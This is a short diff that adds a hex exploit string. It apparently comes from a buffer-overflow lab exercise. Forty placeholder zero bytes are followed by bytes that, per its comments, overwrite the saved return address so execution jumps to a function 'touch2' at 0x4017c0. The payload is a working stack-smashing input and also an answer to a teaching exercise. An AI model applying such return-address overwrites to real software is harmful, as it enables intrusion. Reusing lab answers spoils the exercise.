@@ -1,0 +1,9 @@
+/* 40 bytes as placeholders */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+
+/* corrupt return position on top of the stack to be &touch2=0x4017c0 */
+C0 17 40
